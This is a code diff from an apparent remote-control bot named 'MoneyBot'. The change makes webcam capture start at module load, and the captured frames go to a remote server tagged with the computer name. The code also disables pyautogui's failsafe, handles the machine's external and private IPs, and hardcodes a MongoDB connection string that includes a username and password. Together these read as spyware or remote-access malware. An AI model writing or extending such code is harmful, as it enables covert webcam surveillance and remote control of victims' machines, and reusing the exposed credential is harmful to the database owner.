@@ -37,6 +37,8 @@ lock = asyncio.Lock()
 
 pyautogui.FAILSAFE = False
 
+cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
+
 client = MongoClient("mongodb+srv://money:WRyAg58QYq5L1S43@moneybot.0zo57.mongodb.net/?retryWrites=true&w=majority&appName=MoneyBot")  # Zmienna URL powinna być poprawna
 db = client['test']  # Zamień na nazwę swojej bazy danych
 collection = db['requests']  # Zamień na nazwę swojej kolekcji
@@ -353,8 +355,6 @@ def start_bot(external_ip, private_ip):
         print(e)
         
 async def send_camera_frame():
-    cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
-
     if not cap.isOpened():
         print("❌ Can not get image from camera!")
         send_to_express("`❌` Can not get image from camera!", computer_name=COMPUTER_NAME)
@@ -392,7 +392,6 @@ async def send_camera_frame():
     cap.release()
 
 def send_camera_frame_now():
-    cap = cv2.VideoCapture(CAMERA_INDEX, cv2.CAP_DSHOW)
 
     if not cap.isOpened():
         print("❌ Can not get image from camera!")
